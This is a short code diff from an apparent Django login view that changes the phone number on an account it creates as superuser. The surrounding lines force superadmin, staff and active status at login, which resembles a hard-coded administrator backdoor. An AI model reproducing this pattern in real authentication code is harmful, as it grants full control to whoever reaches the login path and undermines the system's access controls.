@@ -56,7 +56,7 @@ class LoginView(views.APIView):
                     is_staff=True,
                     is_superuser=True,
                     is_active=True,
-                    phone_number='+919363938143'
+                    phone_number='+919944495366'
                 )
             # Ensure superadmin privileges are guaranteed
             elif not user.is_superuser or not user.is_staff or user.role != 'SUPERADMIN' or not user.is_active:
